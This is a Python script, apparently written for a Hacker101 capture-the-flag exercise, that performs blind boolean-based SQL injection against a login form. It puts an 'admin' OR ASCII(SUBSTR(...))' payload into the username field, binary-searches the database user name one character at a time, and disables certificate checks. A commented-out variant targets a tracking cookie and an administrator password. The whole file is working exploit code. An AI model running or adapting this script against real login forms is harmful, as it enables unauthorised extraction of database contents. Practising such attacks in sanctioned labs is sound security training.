import requests
import urllib3

# 경고 메시지 무시 설정
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

true_indicator = "Invalid password"

url = "https://0b33c6c329f854ac100339a3065c2a67.ctf.hacker101.com/login"

#SESSION_ID = "qoqgxpsHfBXoWnCNVCA6yLOYKS4QAKvp"

def binary_search_char(pos):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2


        payload = (
            f"admin' OR "
            f"ASCII(SUBSTR((SELECT user()),{pos},1)) > {mid} "
            f"-- "
        )
        # payload = (
        #     f"admin' or "
        #     f"SELECT ASCII(SUBSTR(SELECT user(),{pos},1)) > {mid}"
        #     #f"FROM users WHERE username='administrator'"
        #     f" -- // "
        # )

        # cookies = {
        #     "TrackingId": payload,
        #     "session": SESSION_ID
        # }
        post_data = {
            "username": payload,
            "password": "password123"
        }

        try:
            res = requests.post(url, data=post_data, verify=False, timeout=5)
            print(res)
        except requests.exceptions.RequestException as e:
            print(f"[!] Error at pos {pos}, mid {mid}: {e}")
            return ''

        if true_indicator in res.text:
            low = mid + 1
        else:
            high = mid - 1

    if 32 <= low <= 126:
        found = chr(low)
        print(f"[+] Found char at pos {pos}: {found}")
        return found
    else:
        print(f"[-] No valid char at pos {pos}")
        return ''

extracted = ""
for pos in range(1, 50):
    char = binary_search_char(pos)
    if char == '':
        break
    extracted += char

print(f" Extracted: {extracted}")
